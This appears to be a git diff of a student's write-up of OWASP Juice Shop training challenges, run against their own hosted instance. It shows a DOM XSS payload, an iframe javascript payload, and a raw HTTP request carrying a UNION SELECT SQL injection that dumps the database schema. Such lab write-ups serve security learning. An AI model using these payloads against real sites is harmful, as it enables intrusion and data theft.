@@ -19,15 +19,17 @@ Link to Heroku OWASP Juice shop app: https://owasp-juice-shop-diego.herokuapp.co
 
 ## Challenges ★
 ### 2.1	Bonus Payload ★
-<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&col-or=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+```<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&col-or=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+```
 
 ### 2.2	Bully Chatbot – Coupon Code ★
 
 ### 2.3	Confidential Document – Sensitive Data Exposure ★
 
 ### 2.4	DOM XSS – Embedded a malicious script in the search function ★
-<script>alert(xss)</script><br/>
+```<script>alert(xss)</script><br/>
 <iframe src="javascript:alert(`xss`)">
+```
  
 ![image](https://user-images.githubusercontent.com/46396750/121338666-ffeeb280-c91d-11eb-869f-cb01cc4b6a0a.png)
 
@@ -175,7 +177,7 @@ xmlhttp.send()
 ```
   
 ### 2.29	Database Schema – Injection (DIFFICULT) ★★★
-GET /rest/products/search?q=apple'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
+```GET /rest/products/search?q=apple'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
 Host: owasp-juice-shop-diego.herokuapp.com
 Connection: close
 sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
@@ -188,6 +190,7 @@ Sec-Fetch-Dest: empty
 Referer: https://owasp-juice-shop-diego.herokuapp.com/
 Accept-Encoding: gzip, deflate
 Accept-Language: nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7
+```
 
 *	Using burp we find out it is a SQLlite database
 *	Using the ‘)) after the search we can start a new query
@@ -355,6 +358,7 @@ Steganography, partice of concealing a message within another message or a physi
 For this challenge we get a hint that we need to look for the Lorem Ipsum. We know that a Lorem Ipsum text is available on the About Us page. There we can find a slideshow of multiple pictures of users. Be-cause we are working with Steganography is used the Openstego tool to try to read each picture. Some-thing I didn’t know is that 1 image had a .png format and there we found a steganography.
 
 It was a Image of Pickle Rick! We then sended a Customer Feedback with Pickle Rick to get the challenge done.
+ <br/> 
   ![image](https://user-images.githubusercontent.com/46396750/121342082-996b9380-c921-11eb-9c9d-f967c0c63577.png)
 
 
